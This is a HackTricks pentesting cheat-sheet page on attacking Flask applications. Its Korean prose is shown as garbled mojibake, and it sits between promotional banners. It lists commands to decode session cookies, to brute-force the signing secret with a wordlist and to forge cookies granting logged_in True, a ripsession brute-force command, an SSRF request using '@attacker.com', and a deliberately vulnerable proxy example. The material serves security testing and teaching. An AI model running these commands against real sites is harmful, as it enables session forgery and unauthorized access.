# Flask

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong></summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.**

</details>

<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=flask)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

**ì•„ë§ˆë„ CTFë¥¼ í”Œë ˆì´ ì¤‘ì´ë¼ë©´ Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì€** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ì™€ ê´€ë ¨ë  ê²ƒì…ë‹ˆë‹¤.**

## Cookies

ê¸°ë³¸ ì¿ í‚¤ ì„¸ì…˜ ì´ë¦„ì€ **`session`**ì…ë‹ˆë‹¤.

### ë””ì½”ë”

ì˜¨ë¼ì¸ Flask ì¿ í‚¤ ë””ì½”ë”: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### ìˆ˜ë™

ì¿ í‚¤ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì„ ì²« ë²ˆì§¸ ì ê¹Œì§€ ê°€ì ¸ì™€ Base64ë¡œ ë””ì½”ë”©í•˜ì„¸ìš”.
```bash
echo "ImhlbGxvIg" | base64 -d
```
### **Flask-Unsign**

ì¿ í‚¤ëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œëª…ë©ë‹ˆë‹¤.

**Flask-Unsign**

Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ì¶”ì¸¡í•˜ì—¬ ë¹„ë°€ í‚¤ë¥¼ ë§ì¶”ê³  ê°€ì ¸ì˜¤ê³  ë””ì½”ë”©í•˜ê³  ë¸Œë£¨íŠ¸ í¬ìŠ¤ ë° ì„¸ì…˜ ì¿ í‚¤ë¥¼ ë§Œë“¤ê¸° ìœ„í•œ ëª…ë ¹ ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **ì¿ í‚¤ ë””ì½”ë”©**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ë¬´ì°¨ë³„ ëŒ€ì…**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ì„œëª…**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ë ˆê±°ì‹œ(ì´ì „ ë²„ì „) ì‚¬ìš©í•˜ì—¬ ì„œëª…í•˜ê¸°
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

flask-unsignìœ¼ë¡œ ì œì‘ëœ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask session cookie with SQLmap

[**ì´ ì˜ˆì œ**](../../pentesting-web/sql-injection/sqlmap/#eval)ëŠ” ì•Œë ¤ì§„ ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ì—¬ Flaskì— ëŒ€í•œ sqlmap í˜ì´ë¡œë“œë¥¼ **ìë™ìœ¼ë¡œ ì„œëª…**í•˜ëŠ” ë° sqlmap `eval` ì˜µì…˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

## Flask Proxy to SSRF

[**ì´ ì„¤ëª…ì„œ**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ì—ì„œ Flaskê°€ "@" ë¬¸ìë¡œ ì‹œì‘í•˜ëŠ” ìš”ì²­ì„ í—ˆìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
```markdown
Could allow to introduce something like "@attacker.com" in order to cause a **SSRF**.

<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=flask) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸° with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
```
